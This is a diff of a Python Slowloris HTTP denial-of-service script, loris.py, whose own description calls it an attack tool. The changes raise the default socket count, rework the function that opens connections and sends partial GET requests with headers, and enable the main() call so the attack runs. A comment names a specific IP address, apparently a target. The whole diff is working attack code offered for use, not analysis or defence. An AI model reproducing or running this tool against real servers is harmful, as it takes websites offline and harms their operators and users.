@@ -7,48 +7,53 @@ import sys
 import time
 
 
-parser = argparse.ArgumentParser(description="********** Slowloris HTTP DoS Attack by gunes **********", prog="loris.py")
+parser = argparse.ArgumentParser(description="********** Slowloris HTTP DoS Attack by gunes **********",
+                                 prog="loris.py",
+                                 usage="loris.py [host] [-p PORT] [-s SOCKETS] [-v VERBOSE]")
 parser.add_argument('host', nargs="?", help="host being attacked")
 parser.add_argument('-p', '--port', default=80, help="port number (Web Server [HTTP] port is 80)", type=int)
-parser.add_argument('-s', '--sockets', default=120, help="number of sockets", type=int)
+parser.add_argument('-s', '--sockets', default=150, help="number of sockets", type=int)
+parser.add_argument('-v', '--verbose', dest="verbose", action="store_true", help="Increases logging")
 args = parser.parse_args()
 
-if len(sys.argv) <= 1:
-    parser.print_help()
-    sys.exit(1)
+if args.host is None:
+    sys.exit("\nA host is not given.")
 
-print(sys.argv)
+if args.verbose:
+    logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.DEBUG)
+else:
+    logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.INFO)
 
-# 160.153.129.19
-
+print("\n\nInitializing attack on:", args.host, "on port:", args.port, "with", args.sockets, "sockets.\n\n")
 
 sockets = []
 ip = args.host
 port = args.port
 
+# 160.153.129.19
 
-def connect(ip):
+
+def connect(host_ip):
+    """
+    Creates a connection to the given IP address.
+    :param host_ip: Ip Address of the host.
+    """
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(4)
     try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(4)
-        sock.connect((ip, port))
-
-        sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
+        sock.connect((host_ip, port))
+        sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1000)).encode("utf-8"))
 
         for header in headers:
             sock.send("{}\r\n".format(header).encode("utf-8"))
 
-        print(sock.getpeername())
-
         return sock
+    except socket.gaierror as e:
+        print("\nAn error occured while connecting to host: ", e)
+        sys.exit(1)
     except socket.error as e:
-        print("An error occured while connecting to host", args.host + ":" + str(args.port)
-        + "\n" , e)
-
-
-print("\n\nConnecting to:", args.host, "on port:", args.port, "with", args.sockets, "sockets.\n\n")
-logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.DEBUG)
-#logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.INFO)
+        print(e)
+        sys.exit(1)
 
 
 def main():
@@ -83,4 +88,4 @@ def main():
                 break
         time.sleep(15)
 
-#main()
+main()
